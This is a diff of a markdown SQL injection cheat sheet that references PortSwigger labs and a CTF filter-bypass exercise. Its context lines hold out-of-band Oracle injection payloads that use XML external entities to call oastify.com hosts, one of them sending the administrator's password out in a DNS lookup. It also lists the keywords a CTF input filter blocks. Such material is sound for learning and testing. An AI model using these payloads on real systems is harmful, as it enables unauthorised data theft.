@@ -373,14 +373,20 @@ and 1=2 union select "1 union select 1,2,3,4-- -",2,3-- - >> Query inside query
 ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://s4xxbrj7yq5ncirvu0461nop2g87w7kw.oastify.com/"> %remote;]>'),'/l') FROM dual--
 ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.otlt0n83nmuj1egrjwt2qjdlrcx3lufi4.oastify.com/"> %remote;]>'),'/l') FROM dual-- >> For retrieve data
 ```
+
 ## XML based filter bypass via XML encoding
 
 **Portswigger Academy Lab:** [Click](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
 
-## Filter bypass using appending
+### Filter Bypass Using Appending 
 
-![Screenshot From 2025-03-28 04-53-04](https://github.com/user-attachments/assets/a29a68ab-4436-4552-abbf-5e91fde6c90a)
+In a CTF challenge, we found an input filtering mechanism with the following filters:  
 
+**Filters:** `or`, `and`, `true`, `false`, `union`, `like`, `=`, `>`, `<`, `;`, `--`, `/* */`, `admin`.  
+
+To bypass this filter, we tried the following payload:  
+
+![Screenshot From 2025-03-28 04-53-04](https://github.com/user-attachments/assets/a29a68ab-4436-4552-abbf-5e91fde6c90a)  
 
 ### CTF
 ```
